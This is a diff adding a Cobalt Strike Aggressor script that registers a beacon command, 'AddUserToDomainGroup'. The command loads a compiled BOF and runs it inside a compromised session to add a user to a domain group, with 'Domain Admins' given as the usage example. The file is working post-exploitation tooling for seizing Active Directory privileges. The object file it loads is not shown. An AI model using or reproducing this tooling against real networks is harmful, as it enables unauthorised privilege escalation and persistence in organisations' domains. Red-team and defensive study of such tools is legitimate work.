@@ -1,0 +1,30 @@
+#author Yaxser (@yas_o_h)
+
+beacon_command_register("AddUserToDomainGroup", "Add a user to a domain group",
+    "Synopsis: AddUserToDomainGroup [username (samAccountName)] [group name]\n\n" . 
+    "Example: AddUserToDomainGroup \"TestUser\" \"Domain Admins\"");
+
+
+
+alias AddUserToDomainGroup {
+    local('$username $groupname')
+    $bid = $1;
+
+    $username = $2;
+    $groupname = $3;
+
+    if ($username eq "" || $groupname eq "") {
+        berror($bid, $beacon_command_detail("AddUserToDomainGroup"));
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("AddUserToDomainGroup.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+
+    $arg_data  = bof_pack($bid, "ZZ", $username, $groupname);
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
